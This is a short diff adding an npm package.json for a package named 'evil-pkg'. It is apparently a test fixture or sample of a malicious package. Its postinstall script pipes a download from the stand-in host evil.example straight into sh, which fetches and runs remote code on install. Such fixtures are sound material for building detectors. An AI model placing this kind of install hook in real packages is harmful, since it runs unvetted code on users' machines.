@@ -1,0 +1,7 @@
+{
+  "name": "evil-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://evil.example/x.sh | sh"
+  }
+}
